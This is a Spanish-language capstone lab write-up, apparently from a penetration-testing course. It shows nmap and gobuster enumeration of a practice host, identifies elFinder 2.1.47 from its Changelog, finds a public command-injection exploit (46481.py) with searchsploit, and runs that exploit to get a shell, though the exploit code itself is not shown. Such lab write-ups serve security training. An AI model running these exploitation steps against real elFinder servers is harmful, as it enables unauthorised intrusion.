# {CATEGORÍA}: {DESCRIPCIÓN}

## Fecha: {FECHA}
## Host: {HOST}
## IP: {IP}
## Objetivo
Capstone Lab: The next VM, Module Exercise VM 2, is running a vulnerable version of the [elFinder](https://github.com/Studio-42/elFinder) web application whose exploit is available . 
Once you've found the application base address through directory brute-forcing, 
modify the exploit to point to the correct application URL and get a shell. 
The flag can be found in the same folder. Note: Before running the exploit, 
remember to place a valid JPEG file on your local Kali machine and name it according to the exploit specifications.
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeramos para identificar la version del software vulnerable
1. Servicios y Puertos:
```bash
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/02_Cap]
└─# nmap -sV -p- -T4 192.168.231.46 -oN ports-services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 15:15 -03
Nmap scan report for 192.168.231.46
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.25 ((Debian))
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 433.81 seconds
```
2. Directorios:
```bash
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/02_Cap]
└─# gobuster dir -u 192.168.231.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.46
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/seclab               (Status: 301) [Size: 317] [--> http://192.168.231.46/seclab/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```
* Segunda vuelta:

```bash
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/02_Cap]
└─# gobuster dir -u 192.168.231.46/seclab -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.46/seclab
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 321] [--> http://192.168.231.46/seclab/img/]
/files                (Status: 301) [Size: 323] [--> http://192.168.231.46/seclab/files/]
/php                  (Status: 301) [Size: 321] [--> http://192.168.231.46/seclab/php/]
/css                  (Status: 301) [Size: 321] [--> http://192.168.231.46/seclab/css/]
/js                   (Status: 301) [Size: 320] [--> http://192.168.231.46/seclab/js/]
/sounds               (Status: 301) [Size: 324] [--> http://192.168.231.46/seclab/sounds/]
/Changelog            (Status: 200) [Size: 55390]
Progress: 39035 / 87665 (44.53%)^C
[!] Keyboard interrupt detected, terminating.                                                                                                                                                                     
Progress: 39055 / 87665 (44.55%)
===============================================================                                                                                                                                                   
Finished                                                                                                                                                                                                          
===============================================================   
```

* Ingresamos en http://192.168.231.46/seclab/Changelog

```bash
2019-02-25  Naoki Sawada  <hypweb+elfinder@gmail.com>

	* elFinder (2.1.47):
		- [js] Fixed #2820 remove Multi-byte space characters
		- [js:jqueryelfinder] bugfix of elfinder reload(restart) on dialogelfinder
		- [ui:places] Fixed #2822 set title attr correctly
		- [ui:tree] add an option `uiOptions.tree.attrTitle` to enable set path info to title attr
		- [js:editors.default] support tinyMCE 5 and integrate image uploader
		- [js:dialogelfinder] Fixed #2824 freezes browser in uses dialogelfinder
		- [ui:button] add CSS class `elfinder-button-{COMMAND NAME}-menu` to submenu
		- [ui:sortbutton] Fixed #2829 sort menu is not synchronized with the data of cwd
		- [ui:cwd] Fixed #2840 thumbnail is not created when adding an image to an empty folder
		- [ui:cwd] Fixed #2836 setting CWD icons size not working
		- [php:core] Fixed #2842 allow to cancel upload on upload.presave callback
		- [js:core] Fixed #2845 `size` request with wrong params `targets`
		- [php:session] Fixed #2857 consideration for environment other than "apache2 SAPI"
		- [cmd:fullscreen] Fixed #2858 add an option of fullscreen mode screen/window
		- And some minor bug fixes


2019-01-14  Naoki Sawada  <hypweb+elfinder@gmail.com>

	* elFinder (2.1.46):

		- [php:core:security] Add an option `urlUploadFilter`(@type callable) to elFinder class constructor options
		- [php:core:security] [CVE-2019-6257] Fixed SSRF vulnerability of `elFinder::get_remote_contents()` [Reporter: Do Ha Anh of Viettel Cyber Security]
		- [ui:button] Fixed #2818 correction of cmd menu position
		- And some minor bug fixes


2019-01-09  Naoki Sawada  <hypweb+elfinder@gmail.com>

	* elFinder (2.1.45):

		- [js] Fixed #2802 broken handling of jQuery `#` selector
		- [cmd:upload] Fixed #2807 correction of event handling of buttons
		- [api:url] Fixed #2808 supports onetime url for the external service
		- [VD:abstract] typo Fixed #2809 undefined ERROR_COPY_INTO_ITSELF
		- [cwd] Fixed problem of thumbnail attaching on mobile devices
		- [cmd:edit:editors.default] Fixed #2815 add Pixo editor integration
		- [cmd:edit] To support onetime URL to get content URL
		- [php:core:security] [CVE-2019-5884] Fixed information leakage vulnerability [Reporter: Ravindra Rajaram (ravindra.rajaram@broadcom.com) and Hamsalekha Madiraju (hamsalekha.madiraju@broadcom.com)]
		- And some minor bug fixes


2018-12-15  Naoki Sawada  <hypweb+elfinder@gmail.com>

	* elFinder (2.1.44):

		- [cmd:sort] Fixed #2774 to make can disable "Also Treeview" sort option
		- [cmd:edit:zoho] Fixed #2777 to show warning when editing items that can not be written anonymously
		- [js:core] Fixed #2783i, #2784 make new event `xhruploadfail`
		- [ui:tree,cwd] Fixed #2785 event handling of droppable element of tree of navbar
		- [VD:abstract] Fixed #2791 correction of `localRmdirRecursive()` for Win server
		- [js:core] Fixed #2799 some files are not saved when uploading multiple files
		- And some minor bug fixes


2018-11-24  Naoki Sawada  <hypweb+elfinder@gmail.com>

	* elFinder (2.1.43):
```

> Encontramos todas las versiones del sofware que fueron utilizadas y sus correspondientes actualizaciones

#### Paso 2: Buscamos el exploit
1. Searchsploit
```bash
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/02_Cap]
└─# searchsploit elFinder 2.1.47                       
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
elFinder 2.1.47 - 'PHP connector' Command Injection                                                                                                                             | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                                                     | php/remote/46539.rb
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                                                     | php/remote/46539.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
* Para ejecutar el exploit debemos primero encontrar el directorio que aloje el archivo **connector.php**
#### Paso 4: Ejecutamos el exploit y obtenemos el flag:
```bash
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/02_Cap]
└─# python2 46481.py http://192.168.231.46/seclab/                         
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...
$ pwd
/var/www/http/seclab/php

$ 
```


## Troubleshooting
## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

